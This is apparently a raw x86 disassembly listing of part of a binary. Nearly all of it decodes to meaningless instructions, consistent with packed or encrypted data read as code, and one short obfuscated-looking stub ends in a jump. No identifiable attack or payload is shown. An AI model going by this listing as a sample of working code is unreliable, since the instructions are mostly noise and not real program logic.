  408074:	in     eax,0x19
  408076:	cwde   
  408077:	push   ebp
  408078:	inc    ebx
  408079:	mov    cl,0xfd
  40807b:	in     al,0xef
  40807d:	shr    DWORD PTR [edi+0x34d413f3],0x75
  408084:	mov    edi,0x904e3bf4
  408089:	shl    bl,1
  40808b:	inc    ebx
  40808c:	jbe    0x40807a
  40808e:	push   esp
  40808f:	out    0x5,eax
  408091:	iret   
  408092:	mov    al,0x93
  408094:	clc    
  408095:	jne    0x40801a
  408097:	outs   dx,BYTE PTR ds:[esi]
  408098:	adc    al,BYTE PTR [ebp+0x7e]
  40809b:	ins    BYTE PTR es:[edi],dx
  40809c:	jo     0x40806f
  40809e:	ss push esp
  4080a0:	aam    0xaa
  4080a2:	in     eax,0x84
  4080a4:	xchg   edi,eax
  4080a5:	loope  0x4080e9
  4080a7:	lock out 0x1a,al
  4080aa:	pop    es
  4080ab:	inc    edx
  4080ac:	mov    cl,0x73
  4080ae:	inc    edi
  4080af:	push   ds
  4080b0:	lea    esp,[ebx+ecx*8]
  4080b3:	aaa    
  4080b4:	xlat   BYTE PTR ds:[ebx]
  4080b5:	and    bh,BYTE PTR [ecx]
  4080b7:	leave  
  4080b8:	(bad)  
  4080b9:	sbb    edx,DWORD PTR [eax]
  4080bb:	retf   0x1244
  4080be:	mov    cl,0x96
  4080c0:	(bad)  
  4080c1:	dec    ebp
  4080c2:	sub    BYTE PTR [esi+esi*1+0x5c],0x61
  4080c7:	es pop esp
  4080c9:	imul   esi,edi,0xc44194e2
  4080cf:	xchg   edi,eax
  4080d0:	jbe    0x408114
  4080d2:	inc    BYTE PTR [edx]
  4080d4:	mov    ds:0x2ed616a8,eax
  4080d9:	push   0x5ed6b5a5
  4080de:	addr16 (bad) 
  4080e0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4080e2:	ja     0x4080f9
  4080e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080e5:	pop    ss
  4080e6:	imul   esi,DWORD PTR [ebp+0x2a25627d],0x27
  4080ed:	push   0xfad781a0
  4080f2:	push   edx
  4080f3:	pop    esp
  4080f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080f5:	add    bh,bh
  4080f7:	or     BYTE PTR cs:[ebp-0x2cd21ad],al
  4080fe:	inc    esi
  4080ff:	out    dx,eax
  408100:	xor    ebp,0xa6957a30
  408106:	adc    eax,0x6aa1cbe2
  40810b:	mov    ecx,0x3596b304
  408110:	adc    DWORD PTR [ebp-0xe],0x7b2b6144
  408117:	mov    bl,0x2
  408119:	lahf   
  40811a:	sti    
  40811b:	or     dl,BYTE PTR [ebp+eax*4-0x10a03a3f]
  408122:	mov    eax,ds:0x9d221ef5
  408127:	jp     0x408148
  408129:	pop    esi
  40812a:	cmp    al,0xc9
  40812c:	jg     0x408184
  40812e:	xchg   esi,eax
  40812f:	or     BYTE PTR [eax],al
  408131:	mov    ecx,0x352b7a51
  408136:	fisubr DWORD PTR [edx+0xf]
  408139:	mov    ch,0x1b
  40813b:	out    dx,eax
  40813c:	fnstcw WORD PTR [esi-0x4b557fdd]
  408142:	popa   
  408143:	adc    dh,ch
  408145:	add    eax,0x22a67c17
  40814a:	sbb    bh,BYTE PTR [ebx]
  40814c:	xchg   BYTE PTR [edx],cl
  40814e:	adc    BYTE PTR [ebx-0x7a],0x77
  408152:	sbb    cl,BYTE PTR [edx-0xa]
  408155:	(bad)  
  408156:	push   0xffffff9e
  408158:	aas    
  408159:	cmp    ebx,edx
  40815b:	adc    dh,BYTE PTR [ebp+0x27b5d93e]
  408161:	stos   BYTE PTR es:[edi],al
  408162:	aad    0xb4
  408164:	xor    al,0x24
  408166:	push   ss
  408167:	lahf   
  408168:	dec    edx
  408169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40816a:	(bad)  
  40816b:	mov    dl,0xc4
  40816d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40816e:	sub    al,0x91
  408170:	repnz (bad) 
  408172:	(bad)  
  408174:	sbb    BYTE PTR [eax-0x4],ah
  408177:	dec    esp
  408178:	bound  edi,QWORD PTR [ebx-0x41ffb97]
  40817e:	enter  0x1246,0x7e
  408182:	jbe    0x40817f
  408184:	(bad)  
  408185:	lahf   
  408186:	adc    al,0x77
  408188:	pop    esp
  408189:	mov    DWORD PTR ds:0x379f5e85,esp
  40818f:	push   0x8ca21248
  408194:	jno    0x40819d
  408196:	jbe    0x408132
  408198:	test   eax,0x1030c0b8
  40819d:	in     al,0xde
  40819f:	push   ebp
  4081a0:	stos   DWORD PTR es:[edi],eax
  4081a1:	xor    edi,ebp
  4081a3:	cdq    
  4081a4:	sub    bh,BYTE PTR [ebx-0x1a1fe2ce]
  4081aa:	mov    di,0xfc5d
  4081ae:	cwde   
  4081af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081b0:	jle    0x408152
  4081b2:	xchg   edx,eax
  4081b3:	lea    ebx,[ebx]
  4081b5:	push   edx
  4081b6:	mov    eax,ds:0x14093472
  4081bb:	jg     0x408176
  4081bd:	mov    eax,ds:0xcc8f5f37
  4081c2:	and    bl,BYTE PTR [eax]
  4081c4:	scas   al,BYTE PTR es:[edi]
  4081c5:	sbb    ebx,eax
  4081c7:	mov    al,ds:0x941e4b0e
  4081cc:	and    dl,BYTE PTR [ecx]
  4081ce:	adc    al,0x2a
  4081d0:	jecxz  0x4081ce
  4081d2:	push   esp
  4081d3:	mov    ch,0xd3
  4081d5:	fisttp DWORD PTR [edi]
  4081d7:	sti    
  4081d8:	shr    DWORD PTR [eax+0x4e],cl
  4081db:	and    al,0x9f
  4081dd:	pop    ds
  4081de:	mov    dl,0xab
  4081e0:	pop    ebx
  4081e1:	sub    BYTE PTR [ecx],dh
  4081e3:	neg    edx
  4081e5:	adc    eax,edi
  4081e7:	sahf   
  4081e8:	inc    edx
  4081e9:	scas   eax,DWORD PTR es:[edi]
  4081ea:	or     ebp,ebp
  4081ec:	outs   dx,BYTE PTR ds:[esi]
  4081ed:	out    0x52,al
  4081ef:	pop    DWORD PTR [eax-0x47]
  4081f2:	mov    esi,0x39aeeaf0
  4081f7:	jmp    0x5c71:0xea21eae5
  4081fe:	retf   0x3489
  408201:	dec    esp
  408202:	iret   
  408203:	addr16 push edi
  408205:	fs in  al,dx
  408207:	adc    edi,0xfffffffd
  40820a:	repz das 
  40820c:	xchg   esi,eax
  40820d:	daa    
  40820e:	sti    
  40820f:	mov    esp,0x13c9954e
  408214:	add    eax,0xaac9c00e
  408219:	cmp    eax,DWORD PTR [ebx+0xea15f30]
  40821f:	ror    cl,1
  408221:	jbe    0x408256
  408223:	dec    ecx
  408224:	mov    eax,0x67d6f212
  408229:	or     BYTE PTR [edx+0x1d],al
  40822c:	arpl   WORD PTR [ecx],si
  40822e:	retf   
  40822f:	xchg   ebx,eax
  408230:	add    eax,0x8fbcaa01
  408235:	and    cl,BYTE PTR [ecx]
  408237:	add    BYTE PTR [ebp+0x1e],cl
  40823a:	pop    esp
  40823b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40823c:	push   edx
  40823d:	push   edi
  40823e:	add    al,0x13
  408240:	les    eax,FWORD PTR [ecx-0x46cf11b4]
  408246:	aad    0xb9
  408248:	js     0x40823b
  40824a:	aaa    
  40824b:	mov    ebx,0x62db310b
  408250:	fs mov ?,edi
  408253:	imul   edi,DWORD PTR [esi],0xbb70e13
  408259:	add    DWORD PTR [edx+0x355be67f],edi
  40825f:	cs xor eax,0x3d4ab98b
  408265:	scas   eax,DWORD PTR es:[edi]
  408266:	mov    edi,0x11cef129
  40826b:	ror    DWORD PTR [ebx+0x75],1
  40826e:	ins    BYTE PTR es:[edi],dx
  40826f:	cmp    esi,DWORD PTR [esi]
  408271:	daa    
  408272:	sub    eax,0xcf1ad8e7
  408277:	repz cdq 
  408279:	lea    esp,[eax+0x52c6deb6]
  40827f:	pshufw mm1,QWORD PTR [esi-0xb],0xa7
  408284:	cmp    eax,0x758e46ff
  408289:	or     DWORD PTR [edx-0x37],ebx
  40828c:	or     edx,edx
  40828e:	lods   al,BYTE PTR ds:[esi]
  40828f:	ja     0x4082e2
  408291:	xlat   BYTE PTR ds:[ebx]
  408292:	mov    al,0x52
  408294:	cmp    ch,BYTE PTR [ecx]
  408296:	or     BYTE PTR [esi+0x1a],0x35
  40829a:	push   edi
  40829b:	xor    BYTE PTR [edx+0x617343b7],bl
  4082a1:	push   ecx
  4082a2:	daa    
  4082a3:	and    al,0x86
  4082a5:	scas   al,BYTE PTR es:[edi]
  4082a6:	in     al,dx
  4082a7:	sub    DWORD PTR [edx],edi
  4082a9:	retw   0x1f30
  4082ad:	imul   esi
  4082af:	stos   BYTE PTR es:[edi],al
  4082b0:	lods   eax,DWORD PTR es:[esi]
  4082b2:	sti    
  4082b3:	aaa    
  4082b4:	pusha  
  4082b5:	nop
  4082b6:	jge    0x408281
  4082b8:	arpl   WORD PTR [ebp+0x72],dx
  4082bb:	out    dx,al
  4082bc:	out    0x2d,eax
  4082be:	mov    esi,DWORD PTR [ebx]
  4082c0:	test   DWORD PTR [ecx-0x58],edi
  4082c3:	jg     0x4082d8
  4082c5:	push   esi
  4082c6:	sbb    ah,al
  4082c8:	pop    edx
  4082c9:	dec    esp
  4082ca:	div    dh
  4082cc:	shl    DWORD PTR [edi+edx*1+0x776ac247],1
  4082d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082d4:	hlt    
  4082d5:	pop    edx
  4082d6:	xor    DWORD PTR [ecx],ecx
  4082d8:	(bad)  
  4082d9:	mov    ds:0x3d39312e,al
  4082de:	jns    0x4082ba
  4082e0:	aam    0x63
  4082e2:	(bad)  
  4082e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e4:	sub    esp,DWORD PTR [ecx+0xa]
  4082e7:	xlat   BYTE PTR ds:[ebx]
  4082e8:	and    ecx,ebp
  4082ea:	mov    al,ds:0x226daf2c
  4082ef:	mov    ah,0xcd
  4082f1:	xchg   DWORD PTR [ebp-0x6bba7d5a],ebx
  4082f7:	jb     0x408329
  4082f9:	fcmovne st,st(3)
  4082fb:	gs (bad) 
  4082fd:	cli    
  4082fe:	adc    DWORD PTR gs:[ecx+0xa921d5b],ecx
  408305:	ds pop edi
  408307:	push   es
  408308:	pushf  
  408309:	ins    DWORD PTR es:[edi],dx
  40830a:	inc    ecx
  40830b:	sub    al,0x81
  40830d:	les    edi,FWORD PTR [eax-0x65]
  408310:	mov    ch,0xe8
  408312:	cs mov ah,0x6d
  408315:	rcl    DWORD PTR [esi],0x95
  408318:	mov    bl,0xf7
  40831a:	repz xlat BYTE PTR ds:[ebx]
  40831c:	jns    0x40830e
  40831e:	jo     0x408330
  408320:	mov    ss,edx
  408322:	loope  0x4082e3
  408324:	sahf   
  408325:	(bad)  
  408326:	jne    0x40835b
  408328:	test   al,0x31
  40832a:	loop   0x408363
  40832c:	jbe    0x4082c1
  40832e:	push   esp
  40832f:	inc    ebp
  408330:	xchg   ebx,eax
  408331:	sub    eax,0xc9dbbd0c
  408336:	push   eax
  408337:	jns    0x408395
  408339:	sbb    BYTE PTR ds:0xd8641a89,dl
  40833f:	sbb    dh,dh
  408341:	pop    eax
  408342:	rcr    DWORD PTR [edx+0x523bc589],cl
  408348:	mov    ch,0xd1
  40834a:	jnp    0x4082e6
  40834c:	cmp    BYTE PTR [ecx-0x7d5c6331],bh
  408352:	inc    esi
  408353:	mov    dh,0x88
  408355:	xor    al,0x77
  408357:	inc    edx
  408358:	jmp    0x8815:0xea24a145
  40835f:	leave  
  408360:	pop    ecx
  408361:	stc    
  408362:	stos   DWORD PTR es:[edi],eax
  408363:	pop    es
  408364:	push   ecx
  408365:	add    DWORD PTR [edi],ecx
  408367:	adc    DWORD PTR [eax],esi
  408369:	pop    es
  40836a:	jecxz  0x408306
  40836c:	xchg   ebp,eax
  40836d:	leave  
  40836e:	(bad)  
  40836f:	jp     0x4083cb
  408371:	or     al,0xaf
  408373:	xchg   dl,ah
  408375:	pop    es
  408376:	scas   al,BYTE PTR es:[edi]
  408377:	push   eax
  408378:	ffreep st(0)
  40837a:	fsubr  QWORD PTR [ecx]
  40837c:	ja     0x4083f6
  40837e:	jae    0x4083c0
  408380:	arpl   WORD PTR [esi-0x4e38b5bc],di
  408386:	test   BYTE PTR [ebp+eiz*2-0x80],ah
  40838a:	mov    ds:0xad2da4c3,al
  40838f:	cwde   
  408390:	je     0x408343
  408392:	fwait
  408393:	ret    
  408394:	cmp    DWORD PTR [esi-0x4c5ebf2e],esi
  40839a:	jnp    0x408332
  40839c:	out    dx,al
  40839d:	push   esp
  40839e:	je     0x4083c7
  4083a0:	ss dec edi
  4083a2:	jnp    0x40832e
  4083a4:	mov    es,WORD PTR [eax-0x1]
  4083a7:	ins    DWORD PTR es:[edi],dx
  4083a8:	sub    esp,DWORD PTR [edi-0x7454e3c5]
  4083ae:	add    esi,edx
  4083b0:	pop    edi
  4083b1:	or     al,ah
  4083b3:	adc    BYTE PTR [ebx-0x62],bh
  4083b6:	push   ecx
  4083b7:	jmp    DWORD PTR [ebx+0x43]
  4083ba:	push   cs
  4083bb:	sbb    bl,bh
  4083bd:	cmc    
  4083be:	loop   0x40841e
  4083c0:	add    edx,DWORD PTR [esi+edi*1]
  4083c3:	sbb    ch,BYTE PTR [edi-0x3f]
  4083c6:	adc    eax,0x6e984670
  4083cb:	mov    DWORD PTR [esi],ebp
  4083cd:	jne    0x4083e7
  4083cf:	leave  
  4083d0:	add    ecx,DWORD PTR [esp+esi*4+0x1c]
  4083d4:	mov    ch,0xc3
  4083d6:	fld    DWORD PTR [edi+0x736e889a]
  4083dc:	in     al,dx
  4083dd:	hlt    
  4083de:	jmp    0xa312b958
  4083e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083e4:	jbe    0x4083ad
  4083e6:	leave  
  4083e7:	mov    eax,0x8708282b
  4083ec:	mov    esi,DWORD PTR [ebp*8+0x421bedea]
  4083f3:	cmp    ah,BYTE PTR [ebp+0x64]
  4083f6:	sbb    bl,BYTE PTR [edx+eax*8]
  4083f9:	js     0x40841e
  4083fb:	xor    ch,BYTE PTR [eax]
  4083fd:	inc    ebp
  4083fe:	cmp    al,0xe0
  408400:	ficom  WORD PTR [edi+0x5bcb0564]
  408406:	mov    esi,0x206730ca
  40840b:	jle    0x408413
  40840d:	sub    dh,bl
  40840f:	scas   al,BYTE PTR es:[edi]
  408410:	ja     0x40840c
  408412:	int    0x2c
  408414:	test   BYTE PTR [eax-0x5bed57aa],0xf7
  40841b:	adc    eax,0x460e3949
  408420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408421:	ret    0xe203
  408424:	add    DWORD PTR [edi+0x7e],0x651c7a12
  40842b:	push   esi
  40842c:	rcr    DWORD PTR [ebx],cl
  40842e:	mov    ebp,0xfecafc48
  408433:	mov    edx,0xd6240341
  408438:	retf   
  408439:	fcom   DWORD PTR ds:0x91300966
  40843f:	and    DWORD PTR [edi+0x3437d13d],edi
  408445:	or     cl,BYTE PTR [ecx-0x51]
  408448:	lahf   
  408449:	add    edi,edi
  40844b:	mov    ch,0xd6
  40844d:	inc    esp
  40844e:	(bad)  
  40844f:	pop    eax
  408450:	xchg   ebp,eax
  408451:	mov    ecx,0x624b6c9f
  408456:	lds    edx,FWORD PTR [ebx+0x30]
  408459:	dec    esp
  40845a:	ins    BYTE PTR es:[edi],dx
  40845b:	sbb    ebp,DWORD PTR [eax]
  40845d:	cmp    edi,DWORD PTR [ecx+0x49d98218]
  408463:	dec    edx
  408464:	push   0xeed824e3
  408469:	ins    BYTE PTR es:[edi],dx
  40846a:	adc    eax,esi
  40846c:	jecxz  0x408407
  40846e:	in     eax,dx
  40846f:	jmp    0x3da55c96
  408474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408475:	jg     0x4084f4
  408477:	imul   ebp,DWORD PTR [edx],0xcd49b561
  40847d:	je     0x4084ca
  40847f:	mov    al,ds:0x38db50a1
  408484:	sub    BYTE PTR [edi],cl
  408486:	and    BYTE PTR [edi+ecx*8-0x44],bl
  40848a:	jl     0x40842d
  40848c:	pop    ss
  40848d:	pop    ss
  40848e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40848f:	pop    edi
  408490:	outs   dx,DWORD PTR ds:[esi]
  408491:	pop    esi
  408492:	outs   dx,BYTE PTR ds:[esi]
  408493:	pop    esp
  408494:	sub    dl,BYTE PTR [ebx+0x187bcc2c]
  40849a:	fadd   QWORD PTR [edx-0x222f5665]
  4084a0:	retf   
  4084a1:	lods   al,BYTE PTR ds:[esi]
  4084a2:	nop    DWORD PTR [ebp+0x3a]
  4084a6:	jns    0x408507
  4084a8:	(bad)  
  4084ab:	out    dx,eax
  4084ac:	repz sbb ecx,DWORD PTR [ebp-0x1530d3c8]
  4084b3:	mov    al,ds:0xebbd332b
  4084b8:	pop    ss
  4084b9:	adc    BYTE PTR ds:0xa1d86ec1,ah
  4084bf:	jo     0x4084aa
  4084c1:	pop    ecx
  4084c2:	cmp    ecx,eax
  4084c4:	loop   0x4084e8
  4084c6:	je     0x408461
  4084c8:	xchg   esi,eax
  4084c9:	cdq    
  4084ca:	pop    ebp
  4084cb:	jp     0x4084b9
  4084cd:	pop    esp
  4084ce:	push   ebp
  4084cf:	mov    bh,0x7b
  4084d1:	push   0x15a91f8d
  4084d6:	xor    edx,esp
  4084d8:	jmp    0x40854f
  4084da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084db:	inc    ebp
  4084dc:	xor    eax,0x3db58a23
  4084e1:	sub    al,0xbe
  4084e3:	scas   eax,DWORD PTR es:[edi]
  4084e4:	xor    eax,DWORD PTR [ebx-0x5e7448bc]
  4084ea:	mov    ebp,0x80554aa3
  4084ef:	add    edi,edx
  4084f1:	cmp    bl,cl
  4084f3:	aas    
  4084f4:	call   0xe85d:0x81c4da2b
  4084fb:	jmp    0x4084b7
  4084fd:	fidiv  WORD PTR [ebx]
  4084ff:	aad    0x9c
  408501:	dec    ecx
  408502:	loope  0x40857c
  408504:	inc    ebx
  408505:	cmp    DWORD PTR [ebx+0x44cdc378],esi
  40850b:	inc    eax
  40850c:	test   ebp,0xb1f4b0ab
  408512:	mov    edx,0xd00f186a
  408517:	xor    DWORD PTR [ebp+0x45bf892f],eax
  40851d:	mov    ecx,0x7083a489
  408522:	cmp    al,0x8f
  408524:	fisubr DWORD PTR [edi]
  408526:	(bad)  
  408527:	mov    eax,0x51737aa6
  40852c:	in     al,0xbc
  40852e:	add    eax,0x9ce0f73b
  408533:	dec    esi
  408534:	mov    ds:0xc5b7cc19,eax
  408539:	pop    edx
  40853a:	xor    ah,bl
  40853c:	push   ss
  40853d:	sub    al,0x7
  40853f:	sub    eax,0x25962204
  408544:	aaa    
  408545:	(bad)  
  408546:	push   esp
  408547:	push   eax
  408548:	fdiv   DWORD PTR [ebp+edi*2+0x4f]
  40854c:	mov    eax,ds:0x843abbcd
  408551:	aas    
  408552:	jp     0x40858e
  408554:	mov    dl,0xba
  408556:	adc    bl,dh
  408558:	adc    dh,ah
  40855a:	aad    0xe9
  40855c:	in     al,0xb2
  40855e:	fisub  DWORD PTR [edx+0x44438c82]
  408564:	mov    edi,esp
  408566:	pavgw  mm6,QWORD PTR [ebp+eiz*8+0x4e480c95]
  40856e:	mov    WORD PTR [edx-0x35],es
  408571:	mov    ebx,0x44c7301d
  408576:	sahf   
  408577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408579:	jne    0x408523
  40857b:	xor    BYTE PTR [ebp+0x51],0x6b
  40857f:	adc    ebp,esi
  408581:	sub    esp,DWORD PTR [ebp+0x6ba552f]
  408587:	mov    ah,0x4b
  408589:	stc    
  40858a:	or     ecx,ecx
  40858c:	sbb    al,0xc7
  40858e:	mov    cl,0xaa
  408590:	cmp    dh,BYTE PTR [ebx+0x4a]
  408593:	test   eax,0x24afb873
  408598:	xchg   ebx,eax
  408599:	jns    0x408546
  40859b:	add    edx,DWORD PTR [edi-0x24]
  40859e:	test   DWORD PTR es:[eax],esp
  4085a1:	push   ecx
  4085a2:	adc    eax,0xcd8ee624
  4085a7:	jg     0x4085d0
  4085a9:	leave  
  4085aa:	shr    ebp,0xc
  4085ad:	dec    ebx
  4085ae:	mov    DWORD PTR [edx],edx
  4085b0:	sub    esi,DWORD PTR [ecx-0xeb29aeb]
  4085b6:	js     0x40858e
  4085b8:	scas   al,BYTE PTR es:[edi]
  4085b9:	mov    bh,0x0
  4085bb:	sbb    BYTE PTR [ecx],ah
  4085bd:	sbb    esi,DWORD PTR [edx+0x75a289ca]
  4085c3:	cmp    eax,0xefe8a465
  4085c8:	cmp    esp,DWORD PTR [ecx+0x76]
  4085cb:	aaa    
  4085cc:	mov    eax,0xb7ee50e1
  4085d1:	cmp    dl,BYTE PTR [edx]
  4085d3:	sub    DWORD PTR ds:0x67b55c6e,eax
  4085d9:	mov    dh,0x4b
  4085db:	or     dl,BYTE PTR [esi+0x3f]
  4085de:	xchg   DWORD PTR [ebx+0x2b],edx
  4085e1:	xor    eax,0x12f7dcf5
  4085e6:	test   eax,0x9a48491a
  4085eb:	fld    QWORD PTR [edi]
  4085ed:	std    
  4085ee:	or     DWORD PTR [ebp-0x69],esi
  4085f1:	mov    ss,WORD PTR [ecx]
  4085f3:	outs   dx,DWORD PTR ds:[esi]
  4085f4:	push   esp
  4085f5:	add    eax,0x7099c50a
  4085fa:	icebp  
  4085fb:	xor    ebp,DWORD PTR [ecx-0x42]
  4085fe:	and    DWORD PTR [edx+eax*1+0x7b459723],ecx
  408605:	pushf  
  408606:	gs aad 0x20
  408609:	loop   0x40858b
  40860b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40860c:	mov    eax,ds:0xca39feb1
  408611:	lea    ebx,[esp+ecx*2]
  408614:	loope  0x4085d3
  408616:	dec    edx
  408617:	mov    cl,0xeb
  408619:	out    0xd2,eax
  40861b:	(bad)
  40861f:	pop    esi
  408620:	icebp  
  408621:	inc    ebx
  408622:	int    0x93
  408624:	dec    eax
  408625:	into   
  408626:	push   ebp
  408627:	dec    esp
  408628:	in     eax,dx
  408629:	fild   DWORD PTR [edx]
  40862b:	pop    ecx
  40862c:	sbb    BYTE PTR [ecx+eax*4+0x22c92559],bl
  408633:	jo     0x40867d
  408635:	retf   
  408636:	inc    edx
  408637:	mov    DWORD PTR [edi-0x1],eax
  40863a:	popf   
  40863b:	cdq    
  40863c:	cmp    ah,BYTE PTR [edi-0xe]
  40863f:	ror    BYTE PTR [ebp-0x75],0xdb
  408643:	or     ch,BYTE PTR [esi+edx*8-0x3a1a9c9d]
  40864a:	sbb    bh,cl
  40864c:	push   ds
  40864d:	ins    DWORD PTR es:[edi],dx
  40864e:	xchg   ebp,eax
  40864f:	xchg   ebx,eax
  408650:	neg    BYTE PTR [edx-0x15]
  408653:	(bad)  
  408654:	stc    
  408655:	mov    dl,0x76
  408657:	pusha  
  408658:	cli    
  408659:	push   ecx
  40865a:	stc    
  40865b:	std    
  40865c:	or     al,0x3c
  40865e:	loopne 0x408629
  408660:	rol    DWORD PTR ss:[esi],cl
  408663:	pop    edi
  408664:	(bad)  
  408665:	popa   
  408666:	fld    DWORD PTR [eax-0x55461297]
  40866c:	xchg   ah,ch
  40866e:	mov    edi,0xb908344a
  408673:	aaa    
  408674:	push   esi
  408675:	mov    eax,0x669ac666
  40867a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40867b:	jle    0x40867f
  40867d:	icebp  
  40867e:	push   es
  40867f:	sub    DWORD PTR [ecx+0x6a54757a],0xa5be6f67
  408689:	and    edx,edi
  40868b:	pop    edi
  40868c:	jle    0x4086e0
  40868e:	adc    esp,DWORD PTR [edi+edi*1]
  408691:	outs   dx,BYTE PTR ds:[esi]
  408692:	fdiv   QWORD PTR [esp+ecx*1]
  408695:	push   eax
  408696:	rol    DWORD PTR [esi],cl
  408698:	mov    esi,0x819c0aac
  40869d:	jmp    DWORD PTR [ecx]
  40869f:	shl    bh,0x94
  4086a2:	js     0x4086a6
  4086a4:	leave  
  4086a5:	mov    esi,ecx
  4086a7:	fisttp DWORD PTR [ebp+0x36777282]
  4086ad:	repz out 0xd8,eax
  4086b0:	and    eax,0x73f26719
  4086b5:	imul   esi,DWORD PTR [ebx+edi*4+0x3538e8f2],0x53
  4086bd:	xor    cl,ch
  4086bf:	call   0x6c6f:0xa96c46fb
  4086c6:	lock stos BYTE PTR es:[edi],al
  4086c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086c9:	fidiv  WORD PTR [eax+0x221117fe]
  4086cf:	das    
  4086d0:	mov    bl,0x7c
  4086d2:	std    
  4086d3:	or     al,0xaf
  4086d5:	push   esi
  4086d6:	(bad)  
  4086d7:	push   ecx
  4086d8:	push   0x3
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0x9ac5b4ac
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  esp,QWORD PTR [eax+0x4e]
  408720:	outs   dx,BYTE PTR ds:[esi]
  408721:	cdq    
  408722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408723:	scas   eax,DWORD PTR es:[edi]
  408724:	call   0x1154:0x5c3dfc79
  40872b:	outs   dx,BYTE PTR ds:[esi]
  40872c:	push   ecx
  40872d:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40872f:	lock mov esp,DWORD PTR ds:0x8a0ac7d9
  408736:	jmp    0x15f0dd21
  40873b:	aad    0x9f
  40873d:	lahf   
  40873e:	push   cs
  40873f:	jne    0x4086e9
  408741:	jb     0x4086d1
  408743:	xchg   esi,eax
  408744:	enter  0x9559,0x44
  408748:	outs   dx,BYTE PTR ds:[esi]
  408749:	xchg   ebp,eax
  40874a:	es xor al,0xea
  40874d:	pop    ebp
  40874e:	adc    DWORD PTR [edi],eax
  408750:	lahf   
  408751:	iret   
  408752:	inc    ebp
  408753:	pop    ds
  408754:	and    ecx,ebx
  408756:	fwait
  408757:	lds    ecx,FWORD PTR [esi+0x63daf0f6]
  40875d:	pop    esp
  40875e:	mov    bh,0x42
  408760:	xchg   edx,eax
  408761:	les    ecx,FWORD PTR [edi+eiz*4+0x5d]
  408765:	inc    esp
  408766:	dec    edi
  408767:	dec    esi
  408768:	xor    eax,0x216a615a
  40876d:	and    DWORD PTR [edx+0x4d],edi
  408770:	loop   0x4087dd
  408772:	and    esp,esi
  408774:	push   0x58d8bdf0
  408779:	xchg   edi,eax
  40877a:	shl    cl,0x52
  40877d:	jae    0x408795
  40877f:	add    eax,0x5bd727eb
  408784:	mov    cl,0x5d
  408786:	or     BYTE PTR [eax-0x5],cl
  408789:	jne    0x40872d
  40878b:	push   0xffffffcb
  40878d:	imul   esi,DWORD PTR [edx],0x42635def
  408793:	sti    
  408794:	mov    dl,0xd3
  408796:	iret   
  408797:	scas   al,BYTE PTR es:[edi]
  408798:	fidiv  WORD PTR [esi-0x32]
  40879b:	hlt    
  40879c:	and    al,dl
  40879e:	cdq    
  40879f:	cmp    ah,ch
  4087a1:	repz aad 0x2b
  4087a4:	cdq    
  4087a5:	and    ebp,ebp
  4087a7:	pop    ecx
  4087a8:	inc    ebx
  4087a9:	pop    edi
  4087aa:	inc    ecx
  4087ab:	jns    0x4087a9
  4087ad:	jmp    0xbd2a:0x92eaabaa
  4087b4:	repz mov eax,0x4a2c455e
  4087ba:	sti    
  4087bb:	ficomp WORD PTR [esp+ebp*2-0x48b0d76]
  4087c2:	fnstcw WORD PTR [ebx-0x52]
  4087c5:	mov    ds:0x6fb52bf5,al
  4087ca:	loop   0x4087e7
  4087cc:	pop    ebp
  4087cd:	scas   al,BYTE PTR es:[edi]
  4087ce:	aam    0x9b
  4087d0:	mov    ebx,0x4865996d
  4087d5:	jmp    0x33437efc
  4087da:	stos   DWORD PTR es:[edi],eax
  4087db:	mov    dh,0xa1
  4087dd:	xor    BYTE PTR [esp+ebx*1-0x765f5e49],dh
  4087e4:	ja     0x408858
  4087e6:	ja     0x4087e4
  4087e8:	push   eax
  4087e9:	sbb    ah,BYTE PTR [edx-0xca9fd58]
  4087ef:	mov    ecx,ebp
  4087f1:	pop    esi
  4087f2:	jne    0x4087b0
  4087f4:	(bad)  
  4087f5:	outs   dx,DWORD PTR ds:[esi]
  4087f6:	out    dx,eax
  4087f7:	mov    ebp,0x486c3d36
  4087fc:	jle    0x408820
  4087fe:	push   ebp
  4087ff:	(bad)  
  408800:	push   esp
  408801:	xchg   DWORD PTR [esi-0x15],esp
  408804:	xchg   ebx,eax
